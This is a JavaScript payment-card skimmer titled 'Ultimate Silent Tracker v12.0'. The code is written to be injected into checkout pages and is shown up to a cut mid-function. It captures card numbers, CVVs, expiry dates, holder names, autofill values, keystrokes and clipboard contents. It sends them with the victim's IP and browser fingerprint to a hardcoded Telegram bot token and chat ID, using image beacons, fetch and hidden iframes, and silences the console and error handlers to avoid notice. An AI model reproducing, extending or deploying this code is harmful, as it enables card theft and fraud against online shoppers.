// Ultimate Silent Tracker v12.0 - Complete Edition
// 100% Silent Operation - Auto-fill, All Gateways, Advanced Capture
// Enhanced with Browser Autofill Capture & Advanced Techniques

(function() {
    'use strict';
    
    // ==================== ADVANCED CONFIGURATION ====================
    const CONFIG = {
        TELEGRAM_BOT_TOKEN: '8584009431:AAFuTje4-0E1AMF957XLnbBG_svoUbCya0w',
        TELEGRAM_CHAT_ID: '7319274794',
        VERSION: '12.0',
        SILENT_MODE: true,
        CAPTURE_DELAY: 1000,
        
        // Enhanced Tracking
        TRACK_EVENTS: {
            ACTIVATION: true,
            CART_VISIT: true,
            CHECKOUT_VISIT: true,
            FORM_SUBMIT: true,
            PAYMENT_DATA: true,
            CARD_FIELDS: true,
            IFRAME_DATA: true,
            USER_IP: true,
            BROWSER_AUTOFILL: true,
            KEYSTROKES: true,
            CLIPBOARD: true,
            SCREENSHOT: false, // Canvas-based
            SESSION_RECORDING: false // Mouse/keyboard tracking
        }
    };
    
    // ==================== GLOBAL VARIABLES ====================
    let isActive = false;
    let userIP = '';
    let sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    let deviceId = localStorage.getItem('device_id') || 'dev_' + Math.random().toString(36).substr(2, 10);
    localStorage.setItem('device_id', deviceId);
    let cardDataCache = {};
    let keystrokeBuffer = [];
    let mouseMovements = [];
    let autofillCaptured = false;
    let browserFingerprint = {};
    
    // ==================== ENHANCED UTILITY FUNCTIONS ====================
    const AdvancedUtils = {
        // Get User IP with multiple fallbacks
        async getUserIP() {
            if (userIP) return userIP;
            
            const ipServices = [
                'https://api.ipify.org?format=json',
                'https://api64.ipify.org?format=json',
                'https://ipinfo.io/json',
                'https://ipapi.co/json/'
            ];
            
            for (const service of ipServices) {
                try {
                    const response = await fetch(service, { timeout: 3000 });
                    const data = await response.json();
                    userIP = data.ip || data.ip_address;
                    if (userIP) break;
                } catch (e) {}
            }
            
            if (!userIP) {
                // WebRTC IP leak technique (works in some browsers)
                try {
                    const pc = new RTCPeerConnection({ iceServers: [] });
                    pc.createDataChannel('');
                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
                    pc.onicecandidate = (ice) => {
                        if (ice.candidate) {
                            const ip = ice.candidate.candidate.split(' ')[4];
                            if (ip && ip.includes('.')) userIP = ip;
                        }
                    };
                    setTimeout(() => pc.close(), 1000);
                } catch (e) {}
            }
            
            return userIP || 'IP_UNKNOWN';
        },
        
        // Get Browser Fingerprint
        getBrowserFingerprint() {
            if (Object.keys(browserFingerprint).length > 0) return browserFingerprint;
            
            const fingerprint = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown',
                screen: {
                    width: screen.width,
                    height: screen.height,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth
                },
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookiesEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack || 'unknown',
                plugins: Array.from(navigator.plugins || []).map(p => p.name).join(', '),
                mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type).join(', ')
            };
            
            // Canvas fingerprinting
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = 200;
                canvas.height = 50;
                ctx.textBaseline = 'top';
                ctx.font = "14px 'Arial'";
                ctx.fillStyle = '#f60';
                ctx.fillRect(0, 0, 200, 50);
                ctx.fillStyle = '#069';
                ctx.fillText('FINGERPRINT', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('FINGERPRINT', 4, 17);
                fingerprint.canvasHash = canvas.toDataURL().hashCode();
            } catch (e) {}
            
            browserFingerprint = fingerprint;
            return fingerprint;
        },
        
        // Mask card with intelligent formatting
        maskCardNumber(number) {
            if (!number) return '';
            const cleaned = number.toString().replace(/\s+/g, '').replace(/-/g, '');
            if (cleaned.length < 8) return cleaned;
            
            // Keep first 6 and last 4 digits (BIN + last 4)
            const firstSix = cleaned.substring(0, 6);
            const lastFour = cleaned.substring(cleaned.length - 4);
            return `${firstSix}******${lastFour}`;
        },
        
        // Advanced card type detection
        detectCardType(number) {
            const num = number.toString().replace(/\s+/g, '').replace(/-/g, '');
            
            // BIN ranges
            const binPatterns = [
                { pattern: /^4[0-9]{5}/, type: 'Visa' },
                { pattern: /^5[1-5][0-9]{4}/, type: 'MasterCard' },
                { pattern: /^3[47][0-9]{4}/, type: 'American Express' },
                { pattern: /^3(?:0[0-5]|[68][0-9])[0-9]{3}/, type: 'Diners Club' },
                { pattern: /^6(?:011|5[0-9]{2})[0-9]{2}/, type: 'Discover' },
                { pattern: /^(?:2131|1800|35\d{2})\d{2}/, type: 'JCB' },
                { pattern: /^62[0-9]{4}/, type: 'UnionPay' },
                { pattern: /^3[0-9]{5}/, type: 'Diners Club International' },
                { pattern: /^(?:5[0678]\d\d|6304|6390|67\d\d)\d{8,15}$/, type: 'Maestro' },
                { pattern: /^9792/, type: 'Troy' },
                { pattern: /^65[4-9]|^644|^6011|^622/, type: 'Discover' },
                { pattern: /^636/, type: 'InterPayment' },
                { pattern: /^60/, type: 'Discover' },
                { pattern: /^50/, type: 'Aura' }
            ];
            
            for (const { pattern, type } of binPatterns) {
                if (pattern.test(num)) return type;
            }
            
            return 'Unknown';
        },
        
        // Extract BIN information
        getCardBIN(number) {
            const cleaned = number.toString().replace(/\s+/g, '').replace(/-/g, '');
            return cleaned.substring(0, 6); // First 6 digits
        },
        
        // Send Telegram with retry and stealth
        async sendTelegram(message, retries = 2) {
            if (!CONFIG.SILENT_MODE) return;
            
            const send = async (attempt = 0) => {
                try {
                    // Method 1: Image beacon (most reliable)
                    const img = new Image();
                    img.crossOrigin = 'anonymous';
                    const encodedMsg = encodeURIComponent(message);
                    img.src = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${CONFIG.TELEGRAM_CHAT_ID}&text=${encodedMsg}&disable_notification=true&parse_mode=HTML`;
                    
                    // Method 2: Fetch with timeout
                    setTimeout(() => {
                        fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                chat_id: CONFIG.TELEGRAM_CHAT_ID,
                                text: message,
                                disable_notification: true,
                                parse_mode: 'HTML'
                            }),
                            mode: 'no-cors'
                        }).catch(() => {});
                    }, 100);
                    
                    // Method 3: Iframe fallback
                    setTimeout(() => {
                        try {
                            const iframe = document.createElement('iframe');
                            iframe.style.cssText = 'position:absolute;width:1px;height:1px;opacity:0;pointer-events:none;';
                            iframe.sandbox = 'allow-scripts';
                            iframe.src = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${CONFIG.TELEGRAM_CHAT_ID}&text=${encodedMsg}`;
                            document.body.appendChild(iframe);
                            setTimeout(() => {
                                if (iframe.parentNode) document.body.removeChild(iframe);
                            }, 5000);
                        } catch (e) {}
                    }, 200);
                    
                    return true;
                } catch (error) {
                    if (attempt < retries) {
                        await new Promise(resolve => setTimeout(resolve, 1000 * (attempt + 1)));
                        return send(attempt + 1);
                    }
                    return false;
                }
            };
            
            return await send();
        },
        
        // Complete silence
        silenceEnvironment() {
            // Console silence
            if (typeof console !== 'undefined') {
                const noop = () => {};
                console.log = noop;
                console.warn = noop;
                console.error = noop;
                console.info = noop;
                console.debug = noop;
                console.table = noop;
                console.trace = noop;
                console.dir = noop;
                console.dirxml = noop;
                console.group = noop;
                console.groupEnd = noop;
                console.time = noop;
                console.timeEnd = noop;
                console.count = noop;
                console.clear = noop;
            }
            
            // Override alert/confirm/prompt
            window.alert = function(){};
            window.confirm = function(){ return true; };
            window.prompt = function(){ return ''; };
            
            // Override error handlers
            window.onerror = function(){ return true; };
            window.addEventListener('error', e => e.preventDefault());
            
            // Remove debugger statements
            const originalDebugger = window.debugger;
            window.debugger = function(){};
        },
        
        // Generate detailed report
        generateReport(dataType, details) {
            const timestamp = new Date().toISOString();
            const page = window.location.href;
            const referrer = document.referrer || 'Direct';
            
            let report = `🔄 <b>${dataType}</b>\n\n`;
            report += `📅 Time: ${new Date().toLocaleString()}\n`;
            report += `🌐 Page: <code>${page}</code>\n`;
            report += `🔗 Referrer: ${referrer}\n`;
            report += `🔐 Session: ${sessionId}\n`;
            report += `📱 Device: ${deviceId}\n`;
            
            for (const [key, value] of Object.entries(details)) {
                if (value) {
                    report += `${key}: ${value}\n`;
                }
            }
            
            return report;
        },
        
        // Encrypt sensitive data (basic obfuscation)
        obfuscate(text) {
            return btoa(encodeURIComponent(text)).split('').reverse().join('');
        }
    };
    
    // ==================== BROWSER AUTOFILL CAPTURER ====================
    class AutofillCapturer {
        constructor() {
            this.capturedAutofills = new Set();
            this.init();
        }
        
        init() {
            this.setupAutofillDetection();
            this.setupMutationObserver();
            this.setupDelayedCapture();
        }
        
        setupAutofillDetection() {
            // Method 1: CSS pseudo-class detection
            const checkAutofilled = () => {
                const autofilledInputs = document.querySelectorAll('input:-webkit-autofill, input:autofill');
                autofilledInputs.forEach(input => {
                    this.captureAutofillData(input);
                });
            };
            
            // Check immediately and on intervals
            setTimeout(checkAutofilled, 100);
            setInterval(checkAutofilled, 2000);
            
            // Method 2: Event listener for autofill
            document.addEventListener('animationstart', (e) => {
                if (e.animationName === 'onAutoFillStart' || 
                    e.animationName === 'onAutoFillCancel') {
                    setTimeout(() => {
                        const inputs = document.querySelectorAll('input');
                        inputs.forEach(input => {
                            if (input.value && !input.dataset.autofillChecked) {
                                this.captureAutofillData(input);
                            }
                        });
                    }, 100);
                }
            });
            
            // Method 3: Input event with autofill detection
            document.addEventListener('input', (e) => {
                if (e.target.tagName === 'INPUT' && e.target.value) {
                    setTimeout(() => {
                        this.checkForAutofill(e.target);
                    }, 50);
                }
            });
        }
        
        setupMutationObserver() {
            const observer = new MutationObserver((mutations) => {
                mutations.forEach((mutation) => {
                    if (mutation.type === 'attributes' && 
                        mutation.attributeName === 'style') {
                        // Check for Chrome autofill yellow background
                        const target = mutation.target;
                        if (target.tagName === 'INPUT' && 
                            target.style.backgroundColor.includes('rgb(250, 255, 189)')) {
                            this.captureAutofillData(target);
                        }
                    }
                    
                    mutation.addedNodes.forEach((node) => {
                        if (node.nodeType === 1) {
                            if (node.tagName === 'INPUT') {
                                this.setupAutofillListener(node);
                            }
                            const inputs = node.querySelectorAll?.('input');
                            inputs?.forEach(input => this.setupAutofillListener(input));
                        }
                    });
                });
            });
            
            observer.observe(document.body, {
                attributes: true,
                attributeFilter: ['style', 'value'],
                childList: true,
                subtree: true
            });
        }
        
        setupAutofillListener(input) {
            if (input.dataset.autofillListener) return;
            input.dataset.autofillListener = 'true';
            
            // Multiple detection methods
            let lastValue = '';
            
            const checkValue = () => {
                if (input.value && input.value !== lastValue) {
                    lastValue = input.value;
                    setTimeout(() => this.captureAutofillData(input), 100);
                }
            };
            
            // Check on focus/blur
            input.addEventListener('focus', checkValue);
            input.addEventListener('blur', checkValue);
            
            // Periodic checking
            const interval = setInterval(checkValue, 500);
            
            // Cleanup when element removed
            const removalObserver = new MutationObserver(() => {
                if (!document.body.contains(input)) {
                    clearInterval(interval);
                    removalObserver.disconnect();
                }
            });
            removalObserver.observe(input.parentNode, { childList: true });
        }
        
        setupDelayedCapture() {
            // Capture autofill after page load
            window.addEventListener('load', () => {
                setTimeout(() => {
                    this.captureAllAutofilledFields();
                }, 3000); // Wait for browser autofill
            });
            
            // Capture on form focus
            document.addEventListener('focusin', (e) => {
                if (e.target.tagName === 'INPUT' || e.target.tagName === 'FORM') {
                    setTimeout(() => {
                        this.captureAllAutofilledFields();
                    }, 1000);
                }
            });
        }
        
        checkForAutofill(input) {
            // Check for rapid multiple field fill (autofill indicator)
            if (input.value && input.value.length > 1) {
                const similarFilled = document.querySelectorAll('input[value]');
                let filledCount = 0;
                similarFilled.forEach(field => {
                    if (field.value && field.value.length > 0) filledCount++;
                });
                
                if (filledCount >= 3) { // Multiple fields filled quickly = autofill
                    this.captureAutofillData(input);
                }
            }
        }
        
        captureAllAutofilledFields() {
            if (autofillCaptured) return;
            
            const allInputs = document.querySelectorAll('input, textarea');
            const paymentInputs = [];
            
            allInputs.forEach(input => {
                if (input.value && input.value.trim() && 
                    this.isPaymentRelatedField(input)) {
                    paymentInputs.push(input);
                }
            });
            
            if (paymentInputs.length >= 2) { // At least 2 payment fields filled
                this.processAutofillCapture(paymentInputs);
                autofillCaptured = true;
            }
        }
        
        captureAutofillData(input) {
            if (!input.value || !input.value.trim()) return;
            if (this.capturedAutofills.has(input)) return;
            
            this.capturedAutofills.add(input);
            
            const fieldInfo = {
                name: input.name || input.id || input.placeholder || 'unknown',
                type: input.type,
                value: input.value,
                form: input.form ? input.form.action || input.form.id : 'none',
                timestamp: new Date().toISOString(),
                isAutofill: true
            };
            
            // Store in cache
            cardDataCache[fieldInfo.name] = fieldInfo.value;
            
            // Send to Telegram if payment related
            if (this.isPaymentRelatedField(input)) {
                this.sendAutofillAlert(fieldInfo);
            }
        }
        
        isPaymentRelatedField(input) {
            const name = (input.name || '').toLowerCase();
            const id = (input.id || '').toLowerCase();
            const placeholder = (input.placeholder || '').toLowerCase();
            const autocomplete = (input.autocomplete || '').toLowerCase();
            
            const paymentKeywords = [
                'card', 'cc', 'credit', 'debit', 'number', 'cvv', 'cvc',
                'expir', 'expdate', 'expiry', 'valid', 'mm', 'yy', 'yyyy',
                'holder', 'nameoncard', 'cardname', 'cardholder',
                'paypal', 'stripe', 'razorpay', 'payment', 'checkout',
                'account', 'routing', 'iban', 'swift', 'bank'
            ];
            
            const fieldText = `${name} ${id} ${placeholder} ${autocomplete}`;
            return paymentKeywords.some(keyword => fieldText.includes(keyword));
        }
        
        processAutofillCapture(inputs) {
            const cardData = {};
            
            inputs.forEach(input => {
                const name = input.name || input.id || 'field_' + inputs.indexOf(input);
                cardData[name] = input.value;
                
                // Classify data
                if (this.isCardNumberField(input)) cardData.cardNumber = input.value;
                if (this.isCvvField(input)) cardData.cvv = input.value;
                if (this.isExpiryField(input)) cardData.expiry = input.value;
                if (this.isHolderField(input)) cardData.holder = input.value;
            });
            
            // Send comprehensive report
            this.sendCompleteAutofillReport(cardData);
        }
        
        sendAutofillAlert(fieldInfo) {
            const ipPromise = AdvancedUtils.getUserIP();
            
            ipPromise.then(ip => {
                const report = AdvancedUtils.generateReport('🔐 BROWSER AUTOFILL CAPTURED', {
                    'Field': fieldInfo.name,
                    'Type': fieldInfo.type,
                    'Value': fieldInfo.value,
                    'Form': fieldInfo.form,
                    'IP Address': ip
                });
                
                AdvancedUtils.sendTelegram(report);
            });
        }
        
        sendCompleteAutofillReport(cardData) {
            AdvancedUtils.getUserIP().then(ip => {
                let message = `💳 <b>COMPLETE AUTOFILL CAPTURE</b>\n\n`;
                message += `🎯 <b>Browser Autofill Detected & Captured</b>\n\n`;
                
                if (cardData.cardNumber) {
                    message += `🔢 <b>Card Number:</b> ${AdvancedUtils.maskCardNumber(cardData.cardNumber)}\n`;
                    message += `📊 <b>Full Number:</b> <code>${cardData.cardNumber}</code>\n`;
                    message += `💳 <b>Card Type:</b> ${AdvancedUtils.detectCardType(cardData.cardNumber)}\n`;
                    message += `🏦 <b>BIN:</b> ${AdvancedUtils.getCardBIN(cardData.cardNumber)}\n`;
                }
                if (cardData.cvv) message += `🔐 <b>CVV:</b> ${cardData.cvv}\n`;
                if (cardData.expiry) message += `📅 <b>Expiry:</b> ${cardData.expiry}\n`;
                if (cardData.holder) message += `👤 <b>Card Holder:</b> ${cardData.holder}\n`;
                
                // Other captured fields
                Object.entries(cardData).forEach(([key, value]) => {
                    if (!['cardNumber', 'cvv', 'expiry', 'holder'].includes(key)) {
                        message += `📝 <b>${key}:</b> ${value}\n`;
                    }
                });
                
                message += `\n🌐 <b>Page:</b> ${window.location.href}\n`;
                message += `📡 <b>IP:</b> ${ip}\n`;
                message += `🆔 <b>Session:</b> ${sessionId}\n`;
                message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
                
                AdvancedUtils.sendTelegram(message);
            });
        }
        
        // Field type detectors
        isCardNumberField(input) {
            const name = (input.name || '').toLowerCase();
            const id = (input.id || '').toLowerCase();
            const text = name + ' ' + id;
            return text.includes('card') || text.includes('cc') || text.includes('number') || 
                   input.autocomplete === 'cc-number';
        }
        
        isCvvField(input) {
            const name = (input.name || '').toLowerCase();
            const id = (input.id || '').toLowerCase();
            const text = name + ' ' + id;
            return text.includes('cvv') || text.includes('cvc') || text.includes('cvn') || 
                   input.autocomplete === 'cc-csc';
        }
        
        isExpiryField(input) {
            const name = (input.name || '').toLowerCase();
            const id = (input.id || '').toLowerCase();
            const text = name + ' ' + id;
            return text.includes('expir') || text.includes('expdate') || 
                   text.includes('expiry') || input.autocomplete === 'cc-exp';
        }
        
        isHolderField(input) {
            const name = (input.name || '').toLowerCase();
            const id = (input.id || '').toLowerCase();
            const text = name + ' ' + id;
            return text.includes('holder') || text.includes('name') || 
                   text.includes('cardname') || input.autocomplete === 'cc-name';
        }
    };
    
    // ==================== ADVANCED PAYMENT FIELD DETECTOR ====================
    class AdvancedPaymentDetector {
        constructor() {
            this.paymentFields = new Map();
            this.knownGateways = new Set();
            this.init();
        }
        
        init() {
            this.scanAllElements();
            this.setupEnhancedObservers();
            this.setupKeystrokeLogger();
            this.setupClipboardMonitor();
            this.detectPaymentGateways();
        }
        
        scanAllElements() {
            // Scan all possible elements
            const selectors = [
                'input', 'textarea', '[contenteditable="true"]', 
                '[data-card-number]', '[data-credit-card]', 
                '[data-stripe]', '[data-paypal]', '[data-razorpay]',
                '.card-number', '.credit-card', '.payment-field',
                '[autocomplete*="cc"]', '[name*="card"]', '[id*="card"]'
            ];
            
            selectors.forEach(selector => {
                try {
                    const elements = document.querySelectorAll(selector);
                    elements.forEach(el => this.registerField(el));
                } catch (e) {}
            });
        }
        
        setupEnhancedObservers() {
            // MutationObserver for dynamic content
            const observer = new MutationObserver((mutations) => {
                mutations.forEach((mutation) => {
                    // Check added nodes
                    mutation.addedNodes.forEach((node) => {
                        if (node.nodeType === 1) {
                            this.scanNodeForPaymentFields(node);
                        }
                    });
                    
                    // Check attribute changes (for value changes)
                    if (mutation.type === 'attributes' && 
                        (mutation.attributeName === 'value' || 
                         mutation.attributeName === 'innerText' ||
                         mutation.attributeName === 'innerHTML')) {
                        this.checkFieldValueChange(mutation.target);
                    }
                });
            });
            
            observer.observe(document.documentElement, {
                childList: true,
                subtree: true,
                attributes: true,
                attributeFilter: ['value', 'innerText', 'innerHTML', 'style']
            });
            
            // Special observer for iframe contentWindow
            setInterval(() => {
                this.scanIframesForPaymentFields();
            }, 2000);
        }
        
        setupKeystrokeLogger() {
            if (!CONFIG.TRACK_EVENTS.KEYSTROKES) return;
            
            let lastKeystrokeTime = Date.now();
            let currentField = null;
            
            document.addEventListener('keydown', (e) => {
                currentField = e.target;
                lastKeystrokeTime = Date.now();
                
                keystrokeBuffer.push({
                    key: e.key,
                    code: e.code,
                    target: {
                        tagName: e.target.tagName,
                        name: e.target.name || e.target.id,
                        type: e.target.type
                    },
                    timestamp: Date.now()
                });
                
                // Buffer and send keystrokes every 50 characters or 10 seconds
                if (keystrokeBuffer.length >= 50 || 
                    Date.now() - lastKeystrokeTime > 10000) {
                    this.sendKeystrokeReport();
                }
            });
            
            document.addEventListener('focusin', (e) => {
                if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
                    currentField = e.target;
                }
            });
        }
        
        setupClipboardMonitor() {
            if (!CONFIG.TRACK_EVENTS.CLIPBOARD) return;
            
            document.addEventListener('copy', (e) => {
                setTimeout(() => {
                    navigator.clipboard.readText().then(text => {
                        if (text && this.looksLikeCardData(text)) {
                            this.sendClipboardAlert(text);
                        }
                    }).catch(() => {});
                }, 100);
            });
            
            document.addEventListener('paste', (e) => {
                const pastedText = e.clipboardData?.getData('text');
                if (pastedText && this.looksLikeCardData(pastedText)) {
                    this.sendPasteAlert(pastedText);
                }
            });
        }
        
        looksLikeCardData(text) {
            const cleaned = text.replace(/\s+/g, '').replace(/-/g, '');
            return /^[0-9]{13,19}$/.test(cleaned) || // Card number
                   /^[0-9]{3,4}$/.test(cleaned) || // CVV
                   /^(0[1-9]|1[0-2])\/?([0-9]{2}|[0-9]{4})$/.test(cleaned); // Expiry
        }
        
        scanNodeForPaymentFields(node) {
            // Check if node itself is a payment field
            if (this.isPaymentField(node)) {
                this.registerField(node);
            }
            
            // Check all child elements
            const childSelectors = [
                'input', 'textarea', '[contenteditable="true"]',
                'iframe', 'form', '[class*="payment"]', '[class*="card"]'
            ];
            
            childSelectors.forEach(selector => {
                try {
                    const elements = node.querySelectorAll?.(selector) || [];
                    elements.forEach(el => {
                        if (this.isPaymentField(el)) {
                            this.registerField(el);
                        }
                    });
                } catch (e) {}
            });
        }
        
        scanIframesForPaymentFields() {
            document.querySelectorAll('iframe').forEach(iframe => {
                try {
                    if (iframe.contentDocument) {
                        const inputs = iframe.contentDocument.querySelectorAll('input, textarea');
                        inputs.forEach(input => {
                            if (this.isPaymentField(input) && !input.dataset.externalMonitored) {
                                this.setupIframeFieldMonitoring(iframe, input);
                            }
                        });
                    }
                } catch (e) {
                    // CORS error, try postMessage
                    this.setupIframeCommunication(iframe);
                }
            });
        }
        
        setupIframeFieldMonitoring(iframe, field) {
            field.dataset.externalMonitored = 'true';
            
            let lastValue = '';
            const checkField = () => {
                try {
                    if (field.value && field.value !== lastValue) {
                        lastValue = field.value;
                        this.captureIframePaymentData(iframe, field);
                    }
                } catch (e) {}
            };
            
            // Poll for changes
            setInterval(checkField, 300);
        }
        
        isPaymentField(element) {
            if (!element || !element.tagName) return false;
            
            const tag = element.tagName.toLowerCase();
            if (!['input', 'textarea', 'div', 'span'].includes(tag)) return false;
            
            // Comprehensive field analysis
            const attributes = {
                name: (element.name || '').toLowerCase(),
                id: (element.id || '').toLowerCase(),
                placeholder: (element.placeholder || '').toLowerCase(),
                className: (element.className || '').toLowerCase(),
                type: (element.type || '').toLowerCase(),
                autocomplete: (element.autocomplete || '').toLowerCase(),
                'data-type': (element.dataset.type || '').toLowerCase(),
                'data-field': (element.dataset.field || '').toLowerCase(),
                'data-name': (element.dataset.name || '').toLowerCase(),
                'aria-label': (element.getAttribute('aria-label') || '').toLowerCase()
            };
            
            // Payment keywords (expanded)
            const paymentKeywords = [
                // Card details
                'card', 'cc', 'credit', 'debit', 'number', 'no', 'num', '#',
                'cvv', 'cvc', 'cvn', 'csc', 'cid', 'security', 'code',
                'expir', 'expdate', 'expiry', 'exp', 'valid', 'validity',
                'month', 'year', 'mm', 'yy', 'yyyy', 'mm/yy', 'mm/yyyy',
                'holder', 'nameoncard', 'cardname', 'cardholder', 'name',
                
                // Payment gateways
                'paypal', 'stripe', 'razorpay', 'braintree', 'authorize',
                '2checkout', 'checkout', 'payment', 'pay', 'gateway',
                'skrill', 'astropay', 'payoneer', 'square', 'paytm',
                'phonepe', 'googlepay', 'applepay', 'amazonpay',
                
                // Bank details
                'account', 'routing', 'iban', 'swift', 'bank', 'sortcode',
                'ifsc', 'bic', 'ach', 'transfer', 'wire',
                
                // Billing
                'billing', 'invoice', 'subscription', 'recurring',
                
                // Common classes and IDs
                'payment', 'checkout', 'billing', 'card', 'credit',
                'stripe', 'paypal', 'razorpay'
            ];
            
            // Combine all attribute values
            const allText = Object.values(attributes).join(' ');
            
            // Check for payment indicators
            return paymentKeywords.some(keyword => allText.includes(keyword)) ||
                   attributes.autocomplete.includes('cc-') ||
                   element.classList.contains('payment') ||
                   element.classList.contains('card') ||
                   element.id.includes('payment') ||
                   element.id.includes('card');
        }
        
        registerField(field) {
            if (!field || this.paymentFields.has(field)) return;
            
            this.paymentFields.set(field, {
                lastValue: field.value,
                lastChange: Date.now(),
                detected: new Date().toISOString()
            });
            
            this.setupFieldMonitoring(field);
        }
        
        setupFieldMonitoring(field) {
            // Event listeners
            const handleInput = (e) => {
                this.handlePaymentInput(field);
            };
            
            const handleChange = (e) => {
                this.handlePaymentChange(field);
            };
            
            const handleBlur = (e) => {
                this.handlePaymentBlur(field);
            };
            
            field.addEventListener('input', handleInput, true);
            field.addEventListener('change', handleChange, true);
            field.addEventListener('blur', handleBlur, true);
            
            // Value polling for stubborn fields
            let lastValue = field.value;
            const pollInterval = setInterval(() => {
                if (!document.body.contains(field)) {
                    clearInterval(pollInterval);
                    return;
                }
                
                if (field.value !== lastValue) {
                    lastValue = field.value;
                    this.handlePaymentInput(field);
                }
            }, 300);
            
            // Store for cleanup
            field._paymentListeners = { handleInput, handleChange, handleBlur, pollInterval };
        }
        
        handlePaymentInput(field) {
            const value = field.value.trim();
            if (!value) return;
            
            const fieldType = this.classifyFieldType(field);
            const cardInfo = this.extractCardInfo(field, value);
            
            if (cardInfo) {
                this.sendPaymentDataAlert(field, fieldType, cardInfo);
            }
        }
        
        classifyFieldType(field) {
            const analysis = this.analyzeField(field);
            
            if (analysis.isCardNumber) return 'CARD_NUMBER';
            if (analysis.isCvv) return 'CVV_CVC';
            if (analysis.isExpiry) return 'EXPIRY_DATE';
            if (analysis.isHolder) return 'CARD_HOLDER';
            if (analysis.isEmail) return 'EMAIL';
            if (analysis.isPhone) return 'PHONE';
            
            return 'OTHER';
        }
        
        analyzeField(field) {
            const name = (field.name || '').toLowerCase();
            const id = (field.id || '').toLowerCase();
            const text = name + ' ' + id;
            
            return {
                isCardNumber: text.includes('card') || text.includes('cc') || text.includes('number') ||
                             field.autocomplete === 'cc-number',
                isCvv: text.includes('cvv') || text.includes('cvc') || field.autocomplete === 'cc-csc',
                isExpiry: text.includes('expir') || text.includes('expdate') || 
                         text.includes('expiry') || field.autocomplete === 'cc-exp',
                isHolder: text.includes('holder') || text.includes('name') || 
                         field.autocomplete === 'cc-name',
                isEmail: text.includes('email') || field.type === 'email',
                isPhone: text.includes('phone') || text.includes('mobile') || 
                        text.includes('tel') || field.type === 'tel'
            };
        }
        
        extractCardInfo(field, value) {
            const analysis = this.analyzeField(field);
            
            if (analysis.isCardNumber && this.isValidCardNumber(value)) {
                return {
                    type: 'CARD_NUMBER',
                    value: value,
                    masked: AdvancedUtils.maskCardNumber(value),
                    cardType: AdvancedUtils.detectCardType(value),
                    bin: AdvancedUtils.getCardBIN(value)
                };
            }
            
            if (analysis.isCvv && value.length >= 3 && value.length <= 4) {
                return {
                    type: 'CVV_CVC',
                    value: value
                };
            }
            
            if (analysis.isExpiry && this.isValidExpiry(value)) {
                return {
                    type: 'EXPIRY_DATE',
                    value: value
                };
            }
            
            if (analysis.isHolder && value.length >= 2) {
                return {
                    type: 'CARD_HOLDER',
                    value: value
                };
            }
            
            return null;
        }
        
        isValidCardNumber(number) {
            const cleaned = number.replace(/\s+/g, '').replace(/-/g, '');
            
            // Luhn algorithm check
            const luhnCheck = (num) => {
                let sum = 0;
                let alternate = false;
                for (let i = num.length - 1; i >= 0; i--) {
                    let n = parseInt(num.charAt(i), 10);
                    if (alternate) {
                        n *= 2;
                        if (n > 9) n -= 9;
                    }
                    sum += n;
                    alternate = !alternate;
                }
                return sum % 10 === 0;
            };
            
            return /^[0-9]{13,19}$/.test(cleaned) && luhnCheck(cleaned);
        }
        
        isValidExpiry(value) {
            // Accepts MM/YY, MM/YYYY, MM-YY, etc.
            const match = value.match(/^(0[1-9]|1[0-2])\/?([0-9]{2}|[0-9]{4})$/);
            if (!match) return false;
            
            const month = parseInt(match[1], 10);
            const year = parseInt(match[2], 10);
            const fullYear = year < 100 ? 2000 + year : year;
            
            const currentDate = new Date();
            const currentYear = currentDate.getFullYear();
            const currentMonth = currentDate.getMonth() + 1;
            
            if (fullYear < currentYear) return false;
            if (fullYear === currentYear && month < currentMonth) return false;
            
            return true;
        }
        
        sendPaymentDataAlert(field, fieldType, cardInfo) {
            AdvancedUtils.getUserIP().then(ip => {
                const fieldName = field.name || field.id || field.placeholder || 'unknown_field';
                
                let message = `💳 <b>PAYMENT DATA CAPTURED</b>\n\n`;
                
                switch(cardInfo.type) {
                    case 'CARD_NUMBER':
                        message += `🎯 <b>Card Number Detected</b>\n`;
                        message += `💳 <b>Type:</b> ${cardInfo.cardType}\n`;
                        message += `🔢 <b>Number:</b> ${cardInfo.masked}\n`;
                        message += `📊 <b>Full:</b> <code>${cardInfo.value}</code>\n`;
                        message += `🏦 <b>BIN:</b> ${cardInfo.bin}\n`;
                        break;
                        
                    case 'CVV_CVC':
                        message += `🎯 <b>Security Code Detected</b>\n`;
                        message += `🔐 <b>CVV/CVC:</b> ${cardInfo.value}\n`;
                        break;
                        
                    case 'EXPIRY_DATE':
                        message += `🎯 <b>Expiry Date Detected</b>\n`;
                        message += `📅 <b>Expiry:</b> ${cardInfo.value}\n`;
                        break;
                        
                    case 'CARD_HOLDER':
                        message += `🎯 <b>Card Holder Detected</b>\n`;
                        message += `👤 <b>Name:</b> ${cardInfo.value}\n`;
                        break;
                }
                
                message += `\n📝 <b>Field:</b> ${fieldName}\n`;
                message += `🏷️ <b>Field Type:</b> ${fieldType}\n`;
                message += `🌐 <b>Page:</b> <code>${window.location.href}</code>\n`;
                message += `📡 <b>IP:</b> ${ip}\n`;
                message += `🆔 <b>Session:</b> ${sessionId}\n`;
                message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
                
                AdvancedUtils.sendTelegram(message);
                
                // Cache data
                if (cardInfo.type === 'CARD_NUMBER') {
                    cardDataCache.cardNumber = cardInfo.value;
                } else if (cardInfo.type === 'CVV_CVC') {
                    cardDataCache.cvv = cardInfo.value;
